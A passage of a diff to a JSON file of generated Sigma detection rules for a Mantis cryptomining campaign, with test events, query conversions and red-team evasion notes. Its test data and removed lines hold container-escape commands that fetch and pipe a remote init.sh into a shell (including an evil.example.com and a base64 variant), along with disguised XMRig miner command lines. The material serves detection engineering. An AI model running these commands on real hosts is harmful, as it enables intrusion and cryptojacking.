+    },
+    {
+      "candidate_id": "D2",
+      "title": "Cron File Written To Etc Cron D Mantis",
+      "sigma_yaml": "title: Cron File Written To Etc Cron D Mantis\nid: abd47d66-389b-4885-b744-b6852b45cc40\nstatus: experimental\ndescription: Detects creation of the malicious cron file /etc/cron.d/mantis used by the Mantis cryptomining campaign for persistence.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.persistence\n- attack.execution\n- attack.t1053.005\nlogsource:\n  category: file_event\n  product: linux\n  service: cron\ndetection:\n  selection_filename:\n    'TargetFilename|endswith': /etc/cron.d/mantis\n  condition: selection_filename\nfalsepositives:\n- Legitimate package management scripts creating cron files in /etc/cron.d/\n- Administrators manually creating cron files in /etc/cron.d/\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1053.005"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Attacker writes the mantis cron file via echo redirect",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/bin/bash",
+            "User": "root"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Attacker writes the mantis cron file using cat with heredoc",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/cat",
+            "User": "root"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Attacker writes the mantis cron file via tee command",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/tee",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Package manager installing a cron job in cron.daily",
+          "event": {
+            "TargetFilename": "/etc/cron.daily/apt-compat",
+            "Image": "/usr/bin/dpkg",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Legitimate admin adding a cron job for log rotation",
+          "event": {
+            "TargetFilename": "/etc/cron.d/logrotate",
+            "Image": "/bin/bash",
+            "User": "root"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "System update creating a temporary cron file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mozilla-common",
+            "Image": "/usr/bin/perl",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Attacker uses vim to create the mantis cron file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/vim",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Attacker uses python3 to write the mantis cron file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/python3",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Attacker uses dd to write the mantis cron file from stdin",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/bin/dd",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Attacker uses install command to copy staged mantis file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/install",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Attacker uses rsync to place the mantis cron file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/rsync",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "positive",
+          "description": "Attacker uses cp to copy staged mantis file into cron.d",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/bin/cp",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Legitimate package manager creates apt-compat cron file",
+          "event": {
+            "TargetFilename": "/etc/cron.d/apt-compat",
+            "Image": "/usr/bin/dpkg",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "System administrator creates backup-jobs cron file for scheduled backups",
+          "event": {
+            "TargetFilename": "/etc/cron.d/backup-jobs",
+            "Image": "/bin/bash",
+            "User": "admin"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Logrotate package installs its cron configuration",
+          "event": {
+            "TargetFilename": "/etc/cron.d/logrotate",
+            "Image": "/usr/bin/install",
+            "User": "root"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D2",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE TargetFilename LIKE '%/etc/cron.d/mantis' ESCAPE '\\'",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 9,
+        "positives_matched": 9,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 0,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "TargetFilename=\"*/etc/cron.d/mantis\"",
+        "elasticsearch": "TargetFilename:*\\/etc\\/cron.d\\/mantis",
+        "kusto": "DeviceFileEvents\n| where FolderPath endswith \"/etc/cron.d/mantis\"",
+        "sqlite": "SELECT * FROM logs WHERE TargetFilename LIKE '%/etc/cron.d/mantis' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 9/9, negatives blocked 6/6, benign hits 0/0",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P9 demonstrate that the rule's single-field condition (TargetFilename endswith '/etc/cron.d/mantis') catches the attacker's goal regardless of the writing binary (vim, python3, dd, install, rsync, cp) or user context (all root, as required for /etc/cron.d/). Each event presents a different Image and realistic command-line surface while preserving the exact TargetFilename literal the rule keys on. Negative variants N1-N3 are benign administrative or package-manager actions that create files in the same directory but with different filenames (apt-compat, backup-jobs, logrotate), proving the rule stays specific to the Mantis indicator. Out-of-scope variants OOS1-OOS3 represent evasions where the host file_event sensor fundamentally does not record a creation event for '/etc/cron.d/mantis': container bind-mount writes invisible to the host, write-then-rename where the sensor only sees the temporary path, and symlink indirection where the sensor records the symlink target. These are reported for the analyst; the rule cannot catch them without additional telemetry (e.g., rename events, container runtime monitoring, or symlink resolution).",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker writes mantis cron file inside container writes /etc/cron.d/mantis via bind mount; host sensor sees no file_event",
+          "event": {
+            "TargetFilename": "/etc/cron.d/mantis",
+            "Image": "/usr/bin/bash",
+            "User": "root"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker writes to /tmp/mantis then renames to /etc/cron.d/mantis; sensor records only the write to /tmp/mantis",
+          "event": {
+            "TargetFilename": "/tmp/mantis",
+            "Image": "/bin/bash",
+            "User": "root"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Attacker creates symlink /etc/cron.d/mantis -> /tmp/mantis and writes through symlink; sensor records write to /tmp/mantis",
+          "event": {
+            "TargetFilename": "/tmp/mantis",
+            "Image": "/usr/bin/tee",
+            "User": "root"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D3",
+      "title": "Kthreadd Miner Execution From Hidden Temp Directory",
+      "sigma_yaml": "title: Kthreadd Miner Execution From Hidden Temp Directory\nid: c4dbbb86-a4bb-4257-b1c6-fd01ea61d695\nstatus: experimental\ndescription: Detects execution of XMRig miner binary named kthreadd from hidden directory /tmp/.x with typical command line\n  arguments for pool, wallet, TLS, and rig-id using hostname substitution.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.execution\n- attack.t1499\nlogsource:\n  category: process_creation\n  product: linux\n  service: docker\ndetection:\n  selection_img:\n    'Image|endswith': /kthreadd\n  selection_path:\n    'Image|contains': /tmp/.x/\n  selection_cmd:\n    'CommandLine|contains|all':\n    - -o\n    - -u\n    - -k\n    - --rig-id\n  condition: 'all of selection_*'\nfalsepositives:\n- Legitimate software using binary name kthreadd (none known)\n- Misconfigured monitoring scripts with similar naming\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1499"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Miner execution with TLS and hostname-based rig-id",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname)",
+            "ParentImage": "/usr/bin/nohup",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Miner execution via sh parent with different wallet and pool",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o stratum+ssl://rx.unmineable.com:3333 -u BTC:1ABC...xyz -k --tls --rig-id worker01",
+            "ParentImage": "/bin/sh",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Miner execution with direct IP and port, no TLS",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o 192.168.1.100:3333 -u monero_wallet -k --rig-id docker-host",
+            "ParentImage": "/usr/bin/nohup",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate nohup usage with sleep command",
+          "event": {
+            "Image": "/usr/bin/sleep",
+            "CommandLine": "/usr/bin/sleep 300",
+            "ParentImage": "/usr/bin/nohup",
+            "CurrentDirectory": "/"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Shell script execution from /tmp without miner characteristics",
+          "event": {
+            "Image": "/bin/bash",
+            "CommandLine": "/bin/bash /tmp/cleanup.sh",
+            "ParentImage": "/usr/bin/cron",
+            "CurrentDirectory": "/"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "System update process with similar naming but legitimate path",
+          "event": {
+            "Image": "/usr/lib/update-notifier/apt-check",
+            "CommandLine": "/usr/lib/update-notifier/apt-check --human-readable",
+            "ParentImage": "/usr/bin/cron",
+            "CurrentDirectory": "/"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Miner executed via bash parent with reordered flags and additional XMRig arguments (--donate-level, --cpu-affinity) while preserving all required flags",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd --rig-id worker-42 -o pool.supportxmr.com:443 -u 4Ad...WalletAddr... -k --tls --donate-level 1 --cpu-affinity 0x3",
+            "ParentImage": "/bin/bash",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Miner invoked with relative path ./kthreadd in CommandLine (sensor records absolute Image), stratum+tcp pool URL, single-quoted arguments",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "./kthreadd -o 'stratum+tcp://xmr.pool.gntl.co:3333' -u '4AbCd...XyZ' -k --rig-id '$(hostname)-rig'",
+            "ParentImage": "/usr/bin/docker-entrypoint.sh",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Container entrypoint launches miner with expanded environment variables in command line (sensor records post-expansion values), no TLS flag",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o 10.0.5.50:5555 -u monero_wallet_123 -k --rig-id container-host-01",
+            "ParentImage": "/sbin/init",
+            "CurrentDirectory": "/"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Miner started via containerd-shim with double-quoted pool URL, rig-id using hostname command substitution expanded by shell",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o \"pool.minexmr.com:7777\" -u \"44AbCd...XyZ\" -k --tls --rig-id \"miner-$(cat /etc/hostname)\"",
+            "ParentImage": "/usr/bin/containerd-shim",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Direct execution (no parent in container PID namespace) with all required flags plus --randomx-1gb-pages and --threads arguments",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd --rig-id docker-host --threads 4 -o pool.hashvault.pro:3333 -u 88Wallet... -k --randomx-1gb-pages",
+            "ParentImage": "",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Legitimate admin binary named kthreadd installed in /opt/miners/ (different directory fails selection_path)",
+          "event": {
+            "Image": "/opt/miners/kthreadd",
+            "CommandLine": "/opt/miners/kthreadd -o pool.example.com:3333 -u wallet -k --rig-id test",
+            "ParentImage": "/bin/bash",
+            "CurrentDirectory": "/opt/miners"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Admin manually runs the hidden binary for inspection but omits -k and --rig-id (fails selection_cmd all-of)",
+          "event": {
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.example.com:3333 -u wallet --help",
+            "ParentImage": "/bin/bash",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Backup script copies the miner binary (Image is cp, not kthreadd; fails selection_img)",
+          "event": {
+            "Image": "/usr/bin/cp",
+            "CommandLine": "cp -a /tmp/.x/kthreadd /backup/miners/kthreadd.bak",
+            "ParentImage": "/bin/bash",
+            "CurrentDirectory": "/tmp/.x"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Monitoring agent stats the binary (Image is stat, CommandLine lacks required flags)",
+          "event": {
+            "Image": "/usr/bin/stat",
+            "CommandLine": "stat /tmp/.x/kthreadd",
+            "ParentImage": "/usr/bin/dockerd-exporter",
+            "CurrentDirectory": "/"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D3",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND Image LIKE '%/tmp/.x/%' ESCAPE '\\' AND (CommandLine LIKE '%-o%' ESCAPE '\\' AND CommandLine LIKE '%-u%' ESCAPE '\\' AND CommandLine LIKE '%-k%' ESCAPE '\\' AND CommandLine LIKE '%--rig-id%' ESCAPE '\\')",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
             "label": "positive",
             "matched": true,
             "passed": true
@@ -1026,7 +1730,7 @@
         ],
         "positives_total": 8,
         "positives_matched": 8,
-        "negatives_total": 8,
+        "negatives_total": 7,
         "negatives_matched": 0,
         "benign_total": 180,
         "benign_hits": 0,
@@ -1034,285 +1738,221 @@
         "passed": true
       },
       "conversions": {
-        "splunk": "ParentImage IN (\"*/containerd-shim-runc-v2\", \"*/dockerd\") CommandLine=\"*chroot*\" CommandLine=\"*/host*\" CommandLine=\"*sh -c*\" CommandLine=\"*|*\" CommandLine=\"*sh*\" CommandLine IN (\"*curl*\", \"*-fsSL*\", \"*http://45.153.160.12/m/init.sh*\") OR CommandLine IN (\"*wget*\", \"*-q*\", \"*-O-*\", \"*http://45.153.160.12/m/init.sh*\")",
-        "elasticsearch": "(ParentImage:(*\\/containerd\\-shim\\-runc\\-v2 OR *\\/dockerd)) AND (CommandLine:*chroot* AND CommandLine:*\\/host*) AND (CommandLine:*sh\\ \\-c* AND CommandLine:*\\|* AND CommandLine:*sh*) AND ((CommandLine:(*curl* OR *\\-fsSL* OR *http\\:\\/\\/45.153.160.12\\/m\\/init.sh*)) OR (CommandLine:(*wget* OR *\\-q* OR *\\-O\\-* OR *http\\:\\/\\/45.153.160.12\\/m\\/init.sh*)))",
-        "kusto": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath endswith \"/containerd-shim-runc-v2\" or InitiatingProcessFolderPath endswith \"/dockerd\") and (ProcessCommandLine contains \"chroot\" and ProcessCommandLine contains \"/host\") and (ProcessCommandLine contains \"sh -c\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\") and ((ProcessCommandLine contains \"curl\" or ProcessCommandLine contains \"-fsSL\" or ProcessCommandLine contains \"http://45.153.160.12/m/init.sh\") or (ProcessCommandLine contains \"wget\" or ProcessCommandLine contains \"-q\" or ProcessCommandLine contains \"-O-\" or ProcessCommandLine contains \"http://45.153.160.12/m/init.sh\"))",
-        "sqlite": "SELECT * FROM logs WHERE (ParentImage LIKE '%/containerd-shim-runc-v2' ESCAPE '\\' OR ParentImage LIKE '%/dockerd' ESCAPE '\\') AND (CommandLine LIKE '%chroot%' ESCAPE '\\' AND CommandLine LIKE '%/host%' ESCAPE '\\') AND (CommandLine LIKE '%sh -c%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') AND ((CommandLine LIKE '%curl%' ESCAPE '\\' OR CommandLine LIKE '%-fsSL%' ESCAPE '\\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' OR CommandLine LIKE '%-q%' ESCAPE '\\' OR CommandLine LIKE '%-O-%' ESCAPE '\\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\\'))"
+        "splunk": "Image=\"*/kthreadd\" Image=\"*/tmp/.x/*\" CommandLine=\"*-o*\" CommandLine=\"*-u*\" CommandLine=\"*-k*\" CommandLine=\"*--rig-id*\"",
+        "elasticsearch": "Image:*\\/kthreadd AND Image:*\\/tmp\\/.x\\/* AND (CommandLine:*\\-o* AND CommandLine:*\\-u* AND CommandLine:*\\-k* AND CommandLine:*\\-\\-rig\\-id*)",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"/kthreadd\" and FolderPath contains \"/tmp/.x/\" and (ProcessCommandLine contains \"-o\" and ProcessCommandLine contains \"-u\" and ProcessCommandLine contains \"-k\" and ProcessCommandLine contains \"--rig-id\")",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND Image LIKE '%/tmp/.x/%' ESCAPE '\\' AND (CommandLine LIKE '%-o%' ESCAPE '\\' AND CommandLine LIKE '%-u%' ESCAPE '\\' AND CommandLine LIKE '%-k%' ESCAPE '\\' AND CommandLine LIKE '%--rig-id%' ESCAPE '\\')"
       },
       "conversion_errors": {},
       "history": [
         {
           "iteration": 0,
           "phase": "initial",
-          "summary": "positives 3/3, negatives blocked 4/4, benign hits 0/180",
-          "passed": true,
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": false,
           "change_summary": ""
         },
         {
-          "iteration": 0,
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Removed '--tls' from required command-line arguments to capture variants without TLS while retaining core miner flags (-o, -u, -k, --rig-id)."
+        },
+        {
+          "iteration": 1,
           "phase": "redteam",
-          "summary": "9 evasion variants -> positives 8/8, negatives blocked 8/8, benign hits 0/180",
+          "summary": "9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/180",
           "passed": true,
           "change_summary": ""
         }
       ],
-      "author_notes": "The rule focuses on the unique combination of container runtime parent, chroot /host escape attempt, and piped execution of a remote script from the threat actor's hardcoded IP. Test events cover both curl and wget variants, variations in quoting and spacing, and clear negative cases including legitimate container shells, administrative docker exec, and isolated chroot usage.",
-      "redteam_analysis": "Positive variants P4-P8 demonstrate realistic operator evasions that preserve all rule-required substrings: ParentImage still ends with the target binary name, CommandLine contains chroot, /host, sh -c, |, sh, and either curl with -fsSL and the exact IP/URL or wget with -q -O- and the exact IP/URL. Variations include flag splitting/reordering (curl -f -s -S -L, wget --quiet --output-document=-), long-form flags, extra whitespace, quoting flips, full binary paths, alternate parent locations (/usr/local/bin, /opt/containerd/bin), and an outer bash -c that still embeds the required sh -c and | sh. Negative variants N1-N4 are benign look-alikes each missing at least one critical selection: N1 has chroot /host but no curl/wget/IP; N2 has curl/IP but no chroot /host; N3 has wget but no chroot /host or shell pipe; N4 has curl but no chroot /host or shell pipe. Out-of-scope variants O1-O4 represent evasions the current rule cannot catch without loosening selections into noise: O1 changes the hardcoded IP to a domain (rule keys on literal IP), O2 renames the parent binary (ParentImage endswith fails), O3 swaps download tool to aria2c (not in selection_curl/wget), O4 removes network download entirely via base64 encoding (no curl/wget substrings). A well-written rule for this logsource can catch P4-P8; O1-O4 require broader threat-intel feeds or behavioral analytics beyond literal substring matching.",
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P8 preserve all three rule selections: Image ends with '/kthreadd', contains '/tmp/.x/', and CommandLine includes -o, -u, -k, and --rig-id. They vary parent (bash, docker-entrypoint, init, containerd-shim, none), flag order, quoting styles, pool URL formats, and additional XMRig flags—surface changes a well-written rule on these fields should absorb. Negative variants N1-N4 are benign look-alikes that each break at least one selection: N1 changes directory, N2 drops required flags, N3/N4 change Image binary. Out-of-scope O1-O2 represent real deployment blind spots: host-level execution and unmonitored container namespaces where the docker process_creation logsource simply has no visibility. The rule cannot catch what the sensor never sees; these are architectural gaps for the analyst to address via broader coverage.",
       "retired_tests": [],
       "replaced_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Attacker uses domain name instead of hardcoded IP; rule keys on literal IP string so this bypasses selection_curl/wget",
+          "description": "Miner runs on Docker host outside container monitoring scope (logsource only sees in-container process creation)",
           "event": {
-            "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'curl -fsSL http://evil.example.com/m/init.sh | sh'\"",
-            "Computer": "docker-host-12",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-12",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id oos1 -address /run/containerd/containerd.sock",
-            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "1111",
-            "ProcessId": "1112",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-25T22:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-25T22:00:00.000Z"
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.example.com:3333 -u wallet -k --rig-id host-miner",
+            "ParentImage": "/usr/bin/nohup",
+            "CurrentDirectory": "/tmp/.x"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "Attacker copies and renames containerd-shim-runc-v2 to /tmp/.hidden; ParentImage endswith no longer matches rule's selection_parent",
+          "description": "Miner executes in unmonitored container namespace (e.g. k8s pod with no runtime hook); sensor never receives event",
           "event": {
-            "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'curl -fsSL http://45.153.160.12/m/init.sh | sh'\"",
-            "Computer": "docker-host-13",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-13",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/tmp/.hidden -namespace moby -id oos2 -address /run/containerd/containerd.sock",
-            "ParentImage": "/tmp/.hidden",
-            "ParentProcessId": "2222",
-            "ProcessId": "2223",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-25T23:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-25T23:00:00.000Z"
-          }
-        },
-        {
-          "id": "X3",
-          "label": "positive",
-          "description": "Attacker uses aria2c instead of curl/wget; download tool not covered by rule's selection_curl or selection_wget",
-          "event": {
-            "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'aria2c -x16 -s16 -k1M http://45.153.160.12/m/init.sh -o - | sh'\"",
-            "Computer": "docker-host-14",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-14",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id oos3 -address /run/containerd/containerd.sock",
-            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "3333",
-            "ProcessId": "3334",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-26T00:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-26T00:00:00.000Z"
-          }
-        },
-        {
-          "id": "X4",
-          "label": "positive",
-          "description": "Attacker base64-encodes payload and decodes locally; no network download in command line so selection_curl/wget cannot match",
-          "event": {
-            "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'echo Y3VybCAtZnNTTCBodHRwOi8vNDUuMTUzLjE2MC4xMi9tL2luaXQuc2ggfCBzaA== | base64 -d | sh'\"",
-            "Computer": "docker-host-15",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-15",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id oos4 -address /run/containerd/containerd.sock",
-            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "4444",
-            "ProcessId": "4445",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-26T01:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-26T01:00:00.000Z"
+            "Image": "/tmp/.x/kthreadd",
+            "CommandLine": "/tmp/.x/kthreadd -o pool.example.com:3333 -u wallet -k --rig-id pod-miner",
+            "ParentImage": "/bin/sh",
+            "CurrentDirectory": "/tmp/.x"
           }
         }
       ]
     },
     {
-      "candidate_id": "D2",
-      "title": "Malicious Cron File mantis Created in /etc/cron.d",
-      "sigma_yaml": "title: Malicious Cron File mantis Created in /etc/cron.d\nid: 40d3b3c0-4ccc-499e-8d45-2545328ec83f\nstatus: experimental\ndescription: Detects creation of the file /etc/cron.d/mantis used by the Mantis campaign for persistence via a cron job that\n  re-infects the host every 15 minutes.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.persistence\n- attack.t1053.005\nlogsource:\n  category: file_event\n  product: linux\ndetection:\n  selection_target:\n    TargetFilename: /etc/cron.d/mantis\n  condition: selection_target\nfalsepositives:\n- Legitimate administrative creation of cron files in /etc/cron.d with unrelated names\nlevel: high\n",
+      "candidate_id": "D5",
+      "title": "Masscan High-Rate Scan for Docker and Redis Ports",
